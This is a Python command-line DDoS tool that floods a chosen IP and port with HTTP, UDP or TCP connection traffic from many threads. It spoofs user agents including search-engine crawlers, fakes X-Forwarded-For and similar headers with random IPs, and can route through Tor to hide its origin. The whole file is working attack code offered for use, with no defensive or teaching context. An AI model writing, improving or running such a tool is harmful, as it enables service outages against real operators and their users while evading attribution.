#!/usr/bin/env python3
import socket, threading, random, time, sys
import socks  # PySocks for Tor support
import urllib.parse

USE_TOR = False  # Set True to enable Tor proxy routing

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "curl/7.64.1",
    "Wget/1.20.3",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
]

STEALTH_HEADERS = [
    "X-Forwarded-For", "Referer", "Origin", "Cache-Control", "X-Real-IP"
]

def stealth_http_headers():
    headers = ""
    headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
    headers += f"{random.choice(STEALTH_HEADERS)}: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
    headers += "Connection: keep-alive\r\n\r\n"
    return headers

def get_socket():
    if USE_TOR:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    return s

def http_flood(ip, port, duration=30, threads=100):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                uri = f"/?cache={random.randint(1000,9999)}"
                payload = f"GET {uri} HTTP/1.1\r\nHost: {ip}\r\n" + stealth_http_headers()
                s.send(payload.encode())
                s.close()
            except:
                pass
    run_threads(attack, threads, duration, "HTTP Flood")

def udp_flood(ip, port, duration=30, threads=100):
    def attack():
        end = time.time() + duration
        msg = random._urandom(1024)
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(msg, (ip, port))
            except:
                pass
    run_threads(attack, threads, duration, "UDP Flood")

def tcp_syn_flood(ip, port, duration=30, threads=100):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.close()
            except:
                pass
    run_threads(attack, threads, duration, "TCP SYN Flood")

def run_threads(attack_func, threads, duration, label):
    print(f"[~] Starting {label} for {duration}s with {threads} threads...")
    for _ in range(threads):
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
    time.sleep(duration)
    print(f"[+] {label} completed.")

def parse_trigger(args):
    if len(args) != 6:
        print("Usage: trigger_ddos <ip> <port> <duration> <threads> <mode>")
        print("Modes: http | udp | tcp")
        sys.exit(1)

    _, ip, port, duration, threads, mode = args
    port = int(port)
    duration = int(duration)
    threads = int(threads)

    if mode == "http":
        http_flood(ip, port, duration, threads)
    elif mode == "udp":
        udp_flood(ip, port, duration, threads)
    elif mode == "tcp":
        tcp_syn_flood(ip, port, duration, threads)
    else:
        print("Invalid mode. Choose: http | udp | tcp")

if __name__ == "__main__":
    parse_trigger(sys.argv)
